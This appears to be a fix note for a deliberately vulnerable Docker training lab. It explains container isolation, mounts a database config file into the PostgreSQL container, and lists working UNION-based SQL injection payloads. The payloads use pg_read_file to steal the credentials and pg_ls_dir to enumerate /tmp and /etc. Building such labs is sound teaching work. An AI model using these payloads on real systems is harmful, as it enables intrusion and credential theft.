# 🔧 File Path Fix: Docker Container Architecture

## ❓ The Problem

When trying to use `pg_read_file('/app/dbconf.ini')`, you got an error:
```
ERROR: could not open file "/app/dbconf.ini" for reading: No such file or directory
```

## 🏗️ Why This Happened

The application uses **two separate Docker containers**:

1. **`typo-postgres`** container (PostgreSQL 15-alpine)
   - This is where the database runs
   - This is where `pg_read_file()` executes

2. **`typo-payments`** container (Python Flask app)
   - This is where the application code runs
   - This is where `dbconf.ini` was originally copied

**The Issue**: Each container has its own filesystem! PostgreSQL can't see files in the application container.

```
┌─────────────────────────┐     ┌──────────────────────────┐
│  typo-postgres          │     │  typo-payments           │
│  (PostgreSQL)           │     │  (Flask App)             │
│                         │     │                          │
│  /tmp/                  │     │  /app/                   │
│  /var/lib/postgresql/   │     │    ├── app.py            │
│  /etc/                  │     │    ├── dbconf.ini ✓      │
│                         │     │    ├── templates/        │
│  ❌ Can't see /app/     │     │    └── static/           │
└─────────────────────────┘     └──────────────────────────┘
```

## ✅ The Solution

**Mount the config file into the PostgreSQL container** using a Docker volume:

```yaml
# docker-compose.yml
services:
  postgres:
    volumes:
      - postgres-data:/var/lib/postgresql/data
      - ./init_db.sql:/docker-entrypoint-initdb.d/init_db.sql
      - ./dbconf.ini:/tmp/dbconf.ini:ro  # ← NEW: Mount config file
```

Now both containers can access it:

```
┌─────────────────────────┐     ┌──────────────────────────┐
│  typo-postgres          │     │  typo-payments           │
│  (PostgreSQL)           │     │  (Flask App)             │
│                         │     │                          │
│  /tmp/                  │     │  /app/                   │
│    └── dbconf.ini ✓     │     │    ├── app.py            │
│  /var/lib/postgresql/   │     │    ├── dbconf.ini        │
│                         │     │    ├── templates/        │
│  ✅ Can read file!      │     │    └── static/           │
└─────────────────────────┘     └──────────────────────────┘
         │                               │
         └───────────────┬───────────────┘
                         │
                Host: ./dbconf.ini
```

## 📍 New File Location

**Updated path**: `/tmp/dbconf.ini` (instead of `/app/dbconf.ini`)

### Why `/tmp/`?

- PostgreSQL can read from `/tmp/` by default
- It's a standard location for temporary/shared files
- The `:ro` (read-only) flag makes it secure
- Reflects that this is a "found" file from an attacker's perspective

## 🎯 Updated Payloads

### Old (didn't work):
```sql
?id=1 UNION SELECT 1, 2, 'config', 0.00, pg_read_file('/app/dbconf.ini'), 'creds', CURRENT_TIMESTAMP
```

### New (works!):
```sql
?id=1 UNION SELECT 1, 2, 'config', 0.00, pg_read_file('/tmp/dbconf.ini'), 'creds', CURRENT_TIMESTAMP
```

## 🧪 Testing the Fix

### 1. Restart containers (already done):
```bash
docker compose up -d
```

### 2. Test from PostgreSQL directly:
```bash
docker compose exec postgres psql -U typo_admin -d typo_payments \
  -c "SELECT pg_read_file('/tmp/dbconf.ini') LIMIT 1;"
```

**Expected**: You'll see the config file contents!

### 3. Test via SQL injection:
```
Login as any user → Status page → 
http://localhost:5000/status?id=1 UNION SELECT 1, 2, 'config', 0.00, pg_read_file('/tmp/dbconf.ini'), 'creds', CURRENT_TIMESTAMP
```

**Expected**: Config file contents displayed in the payment description column!

## 📝 What Was Updated

✅ **docker-compose.yml** - Added volume mount for dbconf.ini
✅ **All documentation** - Changed `/app/` to `/tmp/` in all payloads:
   - docs/POSTGRES_SQLI_PAYLOADS.md
   - docs/CONFIG_FILE_ATTACK.md
   - docs/QUICK_REFERENCE.md (root)
   - docs/QUICK_REFERENCE.md (docs/)

## 🎓 Educational Value

This demonstrates an important real-world concept:

### Container Isolation
- Each container has isolated filesystem
- Volumes/mounts are required to share files
- Attackers need to understand the target architecture

### Attack Reconnaissance
In a real attack, you'd need to:
1. **Enumerate accessible paths** using `pg_ls_dir()`
2. **Try common locations**: `/tmp/`, `/etc/`, `/var/`, `/opt/`
3. **Test different paths** until you find readable files

### Example Enumeration:
```sql
-- Check /tmp/ directory
?id=1 UNION SELECT 1, 2, pg_ls_dir('/tmp'), 0.00, 'tmp dir', 'enum', CURRENT_TIMESTAMP

-- Check /etc/ directory  
?id=1 UNION SELECT 1, 2, pg_ls_dir('/etc'), 0.00, 'etc dir', 'enum', CURRENT_TIMESTAMP

-- Check current directory
?id=1 UNION SELECT 1, 2, pg_ls_dir('.'), 0.00, 'current dir', 'enum', CURRENT_TIMESTAMP
```

## 🚀 Quick Test Command

Try this right now:
```
http://localhost:5000/status?id=1 UNION SELECT 1, 2, 'CREDENTIALS', 0.00, pg_read_file('/tmp/dbconf.ini'), 'JACKPOT', CURRENT_TIMESTAMP
```

You should see all the sensitive credentials! 🎉

## 📚 Related Documentation

- **CONFIG_FILE_ATTACK.md** - Complete guide to config file exploitation
- **POSTGRES_SQLI_PAYLOADS.md** - All SQL injection payloads
- **QUICK_REFERENCE.md** - 30-second startup guide

---

**Fixed**: November 25, 2025  
**File Location**: `/tmp/dbconf.ini`  
**Container**: `typo-postgres`  
**Mount Type**: Read-only volume (`:ro`)
